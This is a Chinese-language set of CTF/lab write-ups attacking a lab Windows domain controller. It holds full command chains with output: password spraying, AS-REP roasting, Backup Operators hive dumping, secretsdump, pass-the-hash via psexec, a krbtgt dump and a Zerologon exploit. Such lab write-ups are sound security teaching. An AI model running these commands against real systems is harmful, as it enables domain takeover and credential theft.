<font style="color:rgb(51, 51, 51);">这一跳是整道题最核心的转折点。前面的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">admin/support</font>`<font style="color:rgb(51, 51, 51);"> 只是拿来查询 LDAP 的低权账号，真正能把题做通的是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);">。</font>

## <font style="color:rgb(51, 51, 51);">第五步：验证 mowen 的权限，确认 Backup Operators 利用可行</font>
<font style="color:rgb(51, 51, 51);">拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen:1maxwell</font>`<font style="color:rgb(51, 51, 51);"> 后，第一件事就是判断它到底有多大权限。这里使用：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">netexec smb 192.168.56.155 -u mowen -p '1maxwell' --shares</font>

<font style="color:rgb(51, 51, 51);">返回结果如下：</font>

```plain
ADMIN$          READ
C$              READ,WRITE
IPC$            READ
NETLOGON        READ
SYSVOL          READ
```

<font style="color:rgb(51, 51, 51);">这个结果说明两件事：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 确实拥有非常强的文件级能力。</font>
+ <font style="color:rgb(51, 51, 51);">它对 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C$</font>`<font style="color:rgb(51, 51, 51);"> 具备读写权限，这和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 的身份完全吻合。</font>

<font style="color:rgb(51, 51, 51);">但此时还不能直接等价于“远程命令执行”。随后测试了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wmiexec.py</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">atexec.py</font>`<font style="color:rgb(51, 51, 51);"> 等方式，结果都返回 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">rpc_s_access_denied</font>`<font style="color:rgb(51, 51, 51);">，说明它并不具备完整的远程执行 ACL。因此正确的思路不是强行打 WMI/计划任务，而是回到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 的本质能力：远程备份系统数据。</font>

## <font style="color:rgb(51, 51, 51);">第六步：利用 Backup Operators 远程备份注册表 hive</font>
<font style="color:rgb(51, 51, 51);">既然 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);">，最稳的利用方式就是使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py</font>`<font style="color:rgb(51, 51, 51);"> 远程备份系统注册表 hive。前面先确认一下远程注册表能否访问：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 query -keyName 'HKLM\\SAM'</font>

<font style="color:rgb(51, 51, 51);">返回：</font>

```plain
HKLM\SAM
HKLM\SAM\SAM
```

<font style="color:rgb(51, 51, 51);">这说明远程注册表访问是通的，后续可以尝试保存。</font>

<font style="color:rgb(51, 51, 51);">接下来直接使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">backup</font>`<font style="color:rgb(51, 51, 51);"> 动作一次性保存三份关键 hive：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 backup -o 'C:\Windows\Temp'</font>

<font style="color:rgb(51, 51, 51);">关键结果如下：</font>

```plain
[*] Saved HKLM\SAM to C:\Windows\Temp\SAM.save
[*] Saved HKLM\SYSTEM to C:\Windows\Temp\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\Windows\Temp\SECURITY.save
```

<font style="color:rgb(51, 51, 51);">这一步的本质是：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM</font>`<font style="color:rgb(51, 51, 51);"> 保存本地账号哈希</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 里有 bootKey，用于解密 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM/SECURITY</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY</font>`<font style="color:rgb(51, 51, 51);"> 里有 LSA Secrets、服务密码、缓存凭据等高价值秘密</font>

<font style="color:rgb(51, 51, 51);">很多人做到这里会卡住，因为他们试图直接走远程执行。但本题真正的提权关键不是远程执行，而是“先把秘密导出来，再离线提取”。</font>

## <font style="color:rgb(51, 51, 51);">第七步：拉回本地并离线提取秘密</font>
<font style="color:rgb(51, 51, 51);">先把远程保存好的三个文件拉回本地：</font>

```plain
netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SAM.save' /tmp/SAM.save
netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SYSTEM.save' /tmp/SYSTEM.save
netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SECURITY.save' /tmp/SECURITY.save
```

<font style="color:rgb(51, 51, 51);">然后使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">secretsdump.py</font>`<font style="color:rgb(51, 51, 51);"> 进行本地离线提取：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">secretsdump.py -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL</font>

<font style="color:rgb(51, 51, 51);">这里的关键输出非常重要：</font>

```plain
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::

[*] _SC_MSSQLSERVER
(Unknown User):Sql!2026
```

<font style="color:rgb(51, 51, 51);">这个结果意味着我们一次性拿到了两个关键资产：</font>

1. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 哈希</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">d94f9831271e229dbc6e712097b63168</font>`
2. <font style="color:rgb(51, 51, 51);">SQL Server 服务密码</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">_SC_MSSQLSERVER = Sql!2026</font>`

<font style="color:rgb(51, 51, 51);">先说第二个。服务密码后来验证对应的是域用户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);">，说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY</font>`<font style="color:rgb(51, 51, 51);"> hive 里确实成功导出了服务机密：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">XMCVE\sqlsvc : Sql!2026</font>

<font style="color:rgb(51, 51, 51);">但这条线虽然能登录 SMB，却没有直接带来远程执行，所以真正决定通关的仍然是第一个东西，也就是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 哈希。</font>

## <font style="color:rgb(51, 51, 51);">第八步：使用 Administrator 哈希直接 Pass-the-Hash，拿到 SYSTEM</font>
<font style="color:rgb(51, 51, 51);">拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 哈希后，最直接的做法就是 PTH。这里使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
psexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168 \
  ./Administrator@192.168.56.155 \
  'whoami'
```

<font style="color:rgb(51, 51, 51);">这条命令里有几个点需要说明：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LM hash</font>`<font style="color:rgb(51, 51, 51);"> 这里用的是空 LM 的固定占位值 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">aad3b435b51404eeaad3b435b51404ee</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT hash</font>`<font style="color:rgb(51, 51, 51);"> 就是刚刚从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM</font>`<font style="color:rgb(51, 51, 51);"> 中提取出来的管理员哈希</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">./Administrator@192.168.56.155</font>`<font style="color:rgb(51, 51, 51);"> 表示使用本地上下文账号发起认证</font>

<font style="color:rgb(51, 51, 51);">关键返回如下：</font>

```plain
[*] Found writable share ADMIN$
[*] Uploading file EXviAwVA.exe
[*] Creating service Uchr on 192.168.56.155.....
[*] Starting service Uchr.....
nt authority\system
```

<font style="color:rgb(51, 51, 51);">为什么这说明已经拿下最高权限？</font>

<font style="color:rgb(51, 51, 51);">因为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`<font style="color:rgb(51, 51, 51);"> 的原理是：</font>

+ <font style="color:rgb(51, 51, 51);">先通过 SMB 把一个服务可执行文件上传到目标机</font>
+ <font style="color:rgb(51, 51, 51);">再通过服务控制管理器创建并启动临时服务</font>
+ <font style="color:rgb(51, 51, 51);">服务默认以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LocalSystem</font>`<font style="color:rgb(51, 51, 51);"> 运行</font>

<font style="color:rgb(51, 51, 51);">也就是说，只要这一套链条完整走通，并且最后执行结果回显 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">nt authority\system</font>`<font style="color:rgb(51, 51, 51);">，就已经不是普通管理员权限，而是标准的 Windows 最高本地权限。</font>

<font style="color:rgb(51, 51, 51);">为了把证据补完整，还进一步执行了：</font>

```plain
psexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168 \
  ./Administrator@192.168.56.155 \
  'whoami /all'
```

<font style="color:rgb(51, 51, 51);">返回结果里明确出现：</font>

```plain
User Name
nt authority\system

SeDebugPrivilege                 Enabled
SeImpersonatePrivilege           Enabled
SeTcbPrivilege                   Enabled
```

<font style="color:rgb(51, 51, 51);">到这里就可以非常明确地确认，本题的最高权限已经拿到。</font>

## <font style="color:rgb(51, 51, 51);">第九步：在已拿到高权限后继续导出整套域凭据</font>
<font style="color:rgb(51, 51, 51);">虽然题目到拿下 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 就已经结束了，但因为目标本身是一台 DC，所以在已有管理员哈希的情况下，还可以顺手把整套域凭据导出来，进一步证明整台域控已经完全接管。</font>

<font style="color:rgb(51, 51, 51);">这里直接使用：</font>

```plain
secretsdump.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168 \
  ./Administrator@192.168.56.155
```

<font style="color:rgb(51, 51, 51);">关键输出如下：</font>

```plain
krbtgt:502:...:1e3c4fe72e1383c576b4b3aeef4730a8:::
Alucard:1000:...:d94f9831271e229dbc6e712097b63168:::
XMCVE.local\mowen:1105:...:efb5fa49a38497a71e144f690860688e:::
XMCVE.local\admin:1110:...:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\sqlsvc:1112:...:d93ef04edb808c5bce3a5bd67b936ca9:::
```

<font style="color:rgb(51, 51, 51);">这里最重要的意义在于：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">krbtgt</font>`<font style="color:rgb(51, 51, 51);"> 哈希已经被导出，说明整个域的核心机密已经暴露。</font>
+ <font style="color:rgb(51, 51, 51);">题目里的所有域用户哈希也全部拿到了。</font>
+ <font style="color:rgb(51, 51, 51);">从“拿到一台主机的 SYSTEM”进一步升级成了“完全接管整套域”。</font>

<font style="color:rgb(51, 51, 51);">因此本题最终的通关状态，不只是单机 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">，而是完整的域控接管。</font>

## <font style="color:rgb(51, 51, 51);">关键命令汇总</font>
<font style="color:rgb(51, 51, 51);">端口识别：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">nmap -Pn -sC -sV -T4 192.168.56.155</font>

<font style="color:rgb(51, 51, 51);">弱口令喷洒：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">netexec smb 192.168.56.155 -u /tmp/babydc_valid_users.txt -p /tmp/babydc_passwords.txt --continue-on-success</font>

<font style="color:rgb(51, 51, 51);">LDAP 查询 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
ldapsearch -x -H ldap://192.168.56.155 \
  -D 'XMCVE\admin' -w 'Password123!' \
  -b 'DC=XMCVE,DC=local' \
  '(sAMAccountName=mowen)' \
  pwdLastSet description memberOf userAccountControl
```

<font style="color:rgb(51, 51, 51);">AS-REP Roast：</font>

```plain
GetNPUsers.py XMCVE.local/ \
  -dc-ip 192.168.56.155 \
  -no-pass \
  -request \
  -format hashcat \
  -outputfile /tmp/mowen_asrep.hash \
  -usersfile /tmp/mowen_only.txt
```

<font style="color:rgb(51, 51, 51);">离线爆破：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">hashcat -m 18200 /tmp/mowen_asrep.hash /usr/share/wordlists/rockyou.txt --force</font>

<font style="color:rgb(51, 51, 51);">远程备份注册表：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 backup -o 'C:\Windows\Temp'</font>

<font style="color:rgb(51, 51, 51);">拉取 hive：</font>

```plain
netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SAM.save' /tmp/SAM.save
netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SYSTEM.save' /tmp/SYSTEM.save
netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SECURITY.save' /tmp/SECURITY.save
```

<font style="color:rgb(51, 51, 51);">离线提取秘密：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">secretsdump.py -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL</font>

<font style="color:rgb(51, 51, 51);">PTH 拿 SYSTEM：</font>

```plain
psexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168 \
  ./Administrator@192.168.56.155 \
  'whoami /all'
```

<font style="color:rgb(51, 51, 51);">导出整域凭据：</font>

```plain
secretsdump.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168 \
  ./Administrator@192.168.56.155
```

## <font style="color:rgb(51, 51, 51);">最终拿到的关键凭据</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\admin : Password123!</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\support : Password123!</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\mowen : 1maxwell</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE\sqlsvc : Sql!2026</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator NTLM : d94f9831271e229dbc6e712097b63168</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">krbtgt NTLM : 1e3c4fe72e1383c576b4b3aeef4730a8</font>`

## <font style="color:rgb(51, 51, 51);">复盘</font>
<font style="color:rgb(51, 51, 51);">这题表面上看是一个带 IIS 和 MSSQL 的 Windows 主机，但真正的核心突破点并不是 Web，也不是 SQL，而是域用户属性和组权限设计。前面的统一弱口令只负责帮我们拿到一个能查询 LDAP 的入口，真正打通题目的关键是：</font>

+ <font style="color:rgb(51, 51, 51);">先通过 LDAP 找到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`
+ <font style="color:rgb(51, 51, 51);">再利用它的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`
+ <font style="color:rgb(51, 51, 51);">拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 口令后再利用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`
+ <font style="color:rgb(51, 51, 51);">最终通过离线提取出来的管理员哈希完成 PTH</font>

<font style="color:rgb(51, 51, 51);">这条链路最大的优点是稳定，不依赖内存注入，不依赖复杂提权洞，也不依赖题目作者额外埋的 Web RCE。只要把账户属性和组权限利用对了，就能非常稳地一路走到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">  
</font>

# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Echoin</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">   </font>
配置好kali和vritualbox：

VirtualBox 靶机 → Host-Only（192.168.56.x）  
 VMware Kali → 也接到 VirtualBox Host-Only 这张网卡

![](/image/myself%20machine/Castlevania-Unexpected-38.png)

在56网段找ip,匹配对应的MAC：08:00:27:f1:06:a7，就是这个靶机的IP

![](/image/myself%20machine/Castlevania-Unexpected-39.png)

ip：192.168.56.101

## nmap
```plain
┌──(echoin㉿kali)-[~]
└─$ nmap -sV 192.168.56.101 -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-29 15:30 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.0014s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: CASTLEVANIA Portal
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-29 07:31:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: XMCVE.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.5026.00; SP2
| ms-sql-ntlm-info: 
|   192.168.56.101:1433: 
|     Target_Name: XMCVE
|     NetBIOS_Domain_Name: XMCVE
|     NetBIOS_Computer_Name: CASTLEVANIA
|     DNS_Domain_Name: XMCVE.local
|     DNS_Computer_Name: CASTLEVANIA.XMCVE.local
|     DNS_Tree_Name: XMCVE.local
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-03-29T07:31:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-29T04:51:28
|_Not valid after:  2056-03-29T04:51:28
| ms-sql-info: 
|   192.168.56.101:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 SP2
|       number: 13.00.5026.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: SP2
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: XMCVE.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:F1:06:A7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1803 (91%), Microsoft Windows 10 1903 - 21H1 (91%), Microsoft Windows Server 2019 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: CASTLEVANIA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: CASTLEVANIA, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f1:06:a7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-03-29T07:31:13
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.37 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.62 seconds
```

关键端口：

+ 53 DNS
+ 80 http
+ 88 Kerberos
+ 389/636/3268/3269 LDAP/GC
+ 139/445 SMB
+ 1433 MSSQL

关键信息：

+ NetBIOS 域名：**XMCVE**
+ 主机名：**CASTLEVANIA**
+ 完整域名：**CASTLEVANIA.XMCVE.local**

## 80端口：访问IP
![](/image/myself%20machine/Castlevania-Unexpected-40.png)

## 扫目录
```plain
feroxbuster -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,asp,txt,config,zip,bak -k
```

![](/image/myself%20machine/Castlevania-Unexpected-41.png)

没扫到

## 1433端口开着，扫一下mssql相关信息：
```plain
nmap -Pn -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info 192.168.56.101
```

![](/image/myself%20machine/Castlevania-Unexpected-42.png)

得到的信息：

+ 1433 ：对应服务是 Microsoft SQL Server 2016 SP2
+ 主机：`CASTLEVANIA`
+ 用户：`XMCVE`
+ 域：`XMCVE.local`

**但现在还不能直接从 SQL 打进去**：`ms-sql-config` 报的是：No login credentials

## 139/445 SMB:共享信息
```plain
smbclient -L //192.168.56.101 -N
```

+ 列出共享名
+ 看到部分共享目录
+ 枚举域信息
+ 枚举用户/组
+ 拿到主机角色信息

但是没有

## 389/636/3268/3269 :LDAP/GC匿名查询
+ 域名
+ OU
+ 用户
+ 组
+ 计算机对象
+ 邮箱
+ 描述字段
+ SPN
+ 域策略线索

```plain
ldapsearch -x -H ldap://192.168.56.101 -s base namingcontexts
ldapsearch -x -H ldap://192.168.56.101 -b "DC=XMCVE,DC=local"
```

![](/image/myself%20machine/Castlevania-Unexpected-43.png)

得到信息：

DC=XMCVE,DC=local  
CN=Configuration,DC=XMCVE,DC=local  
CN=Schema,CN=Configuration,DC=XMCVE,DC=local  
DC=DomainDnsZones,DC=XMCVE,DC=local  
DC=ForestDnsZones,DC=XMCVE,DC=local

分析：

确认这是 AD 域，但后续想拿用户，得先找到凭据

## Kerberos
因为靶机打开页面是有一个用户名Alucard，所以枚举一下

![](/image/myself%20machine/Castlevania-Unexpected-44.png)

Alucard@XMCVE.local

![](/image/myself%20machine/Castlevania-Unexpected-45.png)

administrator@XMCVE.local  
Alucard@XMCVE.local  
sqlsvc@XMCVE.local

再把这 3 个用户一起测一遍 AS-REP Roast

```plain
cat > valid_users.txt << 'EOF'
administrator
Alucard
sqlsvc
EOF

impacket-GetNPUsers XMCVE.local/ -dc-ip 192.168.56.101 -usersfile valid_users.txt -no-pass -request -format hashcat -outputfile asrep.txt
```

都没有UF_DONT_REQUIRE_PREAUTH，所以不行

## 试试cve
+ CVE-2020-1472（Zerologon）
+ CVE-2021-34527（PrintNightmare）

先试一下：CVE-2020-1472（Zerologon）

用 Zerologon 将机器账户密码清空，用 Zerologon 把域控机器账户密码清空之后，利用这个被控制的机器账户身份，通过 AD 复制接口，把域控里的 NTDS 凭据数据同步出来

```plain
impacket-secretsdump -just-dc -no-pass 'XMCVE.local/CASTLEVANIA$@192.168.56.101'
```

![](/image/myself%20machine/Castlevania-Unexpected-46.png)

拿到凭据：

```plain
Administrator NTLM：d94f9831271e229dbc6e712097b63168
Alucard NTLM：d94f9831271e229dbc6e712097b63168
sqlsvc NTLM：d93ef04edb808c5bce3a5bd67b936ca9
CASTLEVANIA$ NTLM：31d6cfe0d16ae931b73c59d7e0c089c0
```

拿 Administrator 的 hash 直接登录

```plain
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168 XMCVE.local/Administrator@192.168.56.101
```

![](/image/myself%20machine/Castlevania-Unexpected-47.png)

# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">k1ne(AI？)</font>
> 很诡异的一篇wp，邮件中回复添加好友也是加的很迅速，询问wp中的问题时晾了我半个小时
>
> 四个问题的回复都是"ai打出来的，我啥也不知道"........真令我恼火
>
> 疑点有四，其一：wp一开始的dirsearch目录扫描就不可能扫到iis内置文本
>
> 该选手对此回复：“我kali里连不上那个靶机，ai扫出来的”
>
> 其二：flag是在哪个位置拿到的？可否截个图
>
> 该选手对此回复："<font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">镜像里指向的是C:\Users\Administrator\Desktop\flag.txt</font>"
>
> 但是flag我在上架环境前便删得一干二净且让他给我截图时选手对此保持沉默无视
>
> 其三：wp里也没有记录p2zhh，mowen的密码获取方式
>
> 该选手对此回复："<font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">sql查出来的，镜像里都有，ai都能识别得到" </font>
>
> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">？？？.....这句话一出我对这道题瞬间变得如此陌生</font>
>
> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">其四：secretsdump出来的hash是如何转出明文的？</font>
>
> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">该选手对此回复："明文是我先拿到哈希，然后镜像有一段明文，然后对比，哈希值一模一"</font>
>
> <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">后续：该选手因别的题导致出现在封神台中</font>
>

## <font style="color:black;">镜像导入</font>
<font style="color:#262626;">下载好镜像导⼊</font>

![](/image/myself%20machine/Castlevania-Unexpected-48.jpeg)

## 信息收集
<font style="color:#262626;">打开发现⽤户需要密码，猜测靶机启动了</font><font style="color:#262626;">web</font><font style="color:#262626;">服务尝试访问主机的⽹络信息，</font>

![](/image/myself%20machine/Castlevania-Unexpected-49.jpeg)

## 扫描端口
<font style="color:#262626;">拿到关键信息</font>

<font style="color:#262626;">靶机ip是10.78.22.137，扫⼀下常⻅的端⼝ </font>

![](/image/myself%20machine/Castlevania-Unexpected-50.jpeg)

<font style="color:#262626;">发现存在⼀些服务，我在</font><font style="color:#262626;"> Kali </font><font style="color:#262626;">中使⽤</font><font style="color:#262626;"> nmap </font><font style="color:#262626;">扫描⽬标时，返回结果显示相关端⼝均为</font><font style="color:#262626;"> filtered</font><font style="color:#262626;">，可能是因为我</font><font style="color:#262626;">kali</font><font style="color:#262626;">在</font><font style="color:#262626;">vm</font><font style="color:#262626;">另⼀套⽹络⾥，可能有隔离。猜测开放了</font><font style="color:#262626;"> Web </font><font style="color:#262626;">与</font><font style="color:#262626;"> MSSQL </font><font style="color:#262626;">等服务。 </font>

## <font style="color:#262626;">目录扫描</font>
<font style="color:#262626;">访问⼀下</font>

<font style="color:#262626;">然后⽬录扫描⼀下有没有备份⽂件之类的</font>

```plain
dirsearch -u http://10.78.22.137/ -e txt,config,bak,old,zip
```

<font style="color:#262626;">发现泄露了⽂件</font>

[<font style="color:#117cee;">http://10.78.22.137/poo_connection.txt</font>](http://10.78.22.137/poo_connection.txt)

![](/image/myself%20machine/Castlevania-Unexpected-51.jpeg)

## Mssql登录&&<font style="color:#262626;">嵌套执行</font>
<font style="color:#262626;">给出了mssql登录凭据尝试登录执⾏sql </font>![](/image/myself%20machine/Castlevania-Unexpected-52.png)

## 查看端口&&枚举用户
![](/image/myself%20machine/Castlevania-Unexpected-53.png)![](/image/myself%20machine/Castlevania-Unexpected-54.png)

## <font style="color:#262626;">验证权限</font>
<font style="color:#262626;">验证mowen身份权限 </font>![](/image/myself%20machine/Castlevania-Unexpected-55.png)![](/image/myself%20machine/Castlevania-Unexpected-56.png)![](/image/myself%20machine/Castlevania-Unexpected-57.png)![](/image/myself%20machine/Castlevania-Unexpected-58.png)

## <font style="color:#262626;">远程连接(失败)</font>![](/image/myself%20machine/Castlevania-Unexpected-59.png)
## 获取hash
<font style="color:#262626;">写脚本进⾏远程拿⽂件在⼀个终端开启</font>

![](/image/myself%20machine/Castlevania-Unexpected-60.png)

<font style="color:#262626;">开另⼀个终端</font>

![](/image/myself%20machine/Castlevania-Unexpected-61.png)

![](/image/myself%20machine/Castlevania-Unexpected-62.png)

## 离线提取Administrator哈希
![](/image/myself%20machine/Castlevania-Unexpected-63.png)

